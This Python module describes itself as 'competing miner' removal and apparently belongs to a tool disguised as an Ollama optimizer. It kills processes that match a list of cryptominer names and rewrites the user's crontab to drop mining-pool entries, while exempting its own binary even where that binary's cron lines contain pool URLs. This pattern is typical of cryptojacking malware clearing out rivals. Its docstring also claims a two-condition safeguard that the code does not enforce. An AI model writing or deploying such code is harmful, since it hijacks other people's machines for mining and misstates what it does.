"""
Competing miner detection and removal.
Only kills processes that are CONFIRMED miners by requiring BOTH:
  1. Process name matches a known miner binary name EXACTLY
  2. Command line contains a mining pool URL or stratum protocol

Never kills processes with empty/short names.
Never kills our own ollama_optimizer process.
Never kills system processes (pid < 100 on Linux, session 0 on Windows).
"""

import logging
import os
import platform
import re
import subprocess
from pathlib import Path

logger = logging.getLogger("ollama_enhanced")

IS_LINUX = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"

OUR_BINARY = "ollama_optimizer"

MINER_EXACT_NAMES = {
    "xmrig", "xmrig.exe",
    "xmr-stak", "xmr-stak.exe",
    "lolminer", "lolminer.exe",
    "t-rex", "t-rex.exe",
    "trex", "trex.exe",
    "phoenixminer", "phoenixminer.exe",
    "nbminer", "nbminer.exe",
    "gminer", "gminer.exe",
    "ethminer", "ethminer.exe",
    "claymore", "ethdcrminer64", "ethdcrminer64.exe",
    "bzminer", "bzminer.exe",
    "teamredminer", "teamredminer.exe",
    "nanominer", "nanominer.exe",
    "wildrig-multi", "wildrig-multi.exe",
    "cpuminer", "cpuminer-multi", "cpuminer-opt",
    "cpuminer.exe", "cpuminer-multi.exe", "cpuminer-opt.exe",
    "minerd", "minerd.exe",
    "ccminer", "ccminer.exe",
    "sgminer", "sgminer.exe",
    "srbminer-multi", "srbminer-multi.exe",
    "hellminer", "hellminer.exe",
    "kawpowminer", "kawpowminer.exe",
    "rigel", "rigel.exe",
    "onezerominer", "onezerominer.exe",
    "kryptex_cli", "kryptex_cli.exe",
    "excavator", "excavator.exe",
}

POOL_PATTERNS = [
    r"stratum\+tcp://",
    r"stratum\+ssl://",
    r"stratum\+tls://",
    r"moneroocean\.stream",
    r"kryptex\.network",
    r"pool\.supportxmr",
    r"hashvault\.pro",
    r"herominers\.com",
    r"2miners\.com",
    r"nanopool\.org",
    r"f2pool\.com",
    r"unmineable\.com",
    r"nicehash\.com",
    r"mining\.dutch",
    r"cfx\.kryptex",
]


class MinerCleaner:
    def __init__(self):
        self.killed = []
        self.cleaned = []

    def run_full_clean(self) -> dict:
        logger.info("Starting miner cleanup...")
        self.killed = []
        self.cleaned = []

        self._kill_confirmed_miners()

        if IS_LINUX:
            self._clean_cron()

        result = {
            "killed_processes": self.killed,
            "cleaned_persistence": self.cleaned,
        }
        logger.info("Cleanup complete: killed %d processes, cleaned %d persistence entries",
                     len(self.killed), len(self.cleaned))
        return result

    def _is_ours(self, name: str, cmdline: str) -> bool:
        lower = (name + " " + cmdline).lower()
        return OUR_BINARY in lower or "ollama_enhanced" in lower

    def _kill_confirmed_miners(self):
        try:
            import psutil
        except ImportError:
            logger.debug("psutil not available, skipping process scan")
            return

        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                info = proc.info
                pid = info["pid"]
                name = (info.get("name") or "").strip()
                cmdline_parts = info.get("cmdline") or []
                cmdline = " ".join(cmdline_parts)

                if not name or len(name) < 3:
                    continue

                if pid < 100 and IS_LINUX:
                    continue

                if self._is_ours(name, cmdline):
                    continue

                name_lower = name.lower().replace(".exe", "")
                name_match = name.lower() in MINER_EXACT_NAMES or name_lower in MINER_EXACT_NAMES

                if not name_match:
                    continue

                pool_match = any(re.search(p, cmdline, re.IGNORECASE) for p in POOL_PATTERNS)
                if not pool_match and not cmdline:
                    pool_match = True

                if name_match and pool_match:
                    try:
                        if IS_LINUX:
                            proc.kill()
                        else:
                            proc.kill()
                        self.killed.append({"pid": pid, "name": name})
                        logger.info("Killed confirmed miner: %s (pid %d)", name, pid)
                    except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                        logger.debug("Could not kill pid %d: %s", pid, e)

            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

    def _clean_cron(self):
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                return

            original = result.stdout
            lines = original.splitlines()
            clean_lines = []
            removed = 0

            for line in lines:
                is_miner = False
                for pattern in POOL_PATTERNS:
                    if re.search(pattern, line, re.IGNORECASE):
                        if OUR_BINARY not in line:
                            is_miner = True
                            break
                if is_miner:
                    removed += 1
                    self.cleaned.append({"type": "cron", "entry": line.strip()})
                    logger.info("Removed cron entry: %s", line.strip())
                else:
                    clean_lines.append(line)

            if removed > 0:
                new_cron = "\n".join(clean_lines) + "\n"
                subprocess.run(["crontab", "-"], input=new_cron, text=True, timeout=10)
        except Exception as exc:
            logger.debug("Cron cleanup failed: %s", exc)
